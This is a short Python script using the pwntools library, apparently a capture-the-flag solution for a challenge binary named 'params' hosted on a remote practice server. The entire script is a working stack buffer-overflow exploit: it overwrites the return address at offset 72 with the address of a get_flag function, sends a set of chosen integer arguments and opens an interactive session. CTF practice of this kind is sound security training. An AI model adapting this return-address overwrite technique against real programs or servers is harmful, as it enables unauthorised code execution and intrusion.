#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './build/params'
e = context.binary

p = remote('forever.isss.io', 1304)

payload = flat({72: e.sym['get_flag']})

p.sendline(payload)
p.sendline('0')
p.sendline('0')
p.sendline(str(4))
p.sendline(str(0xdeadbeef))
p.sendline(str(0xcafebabe))
p.sendline(str(0x1337))
p.interactive()
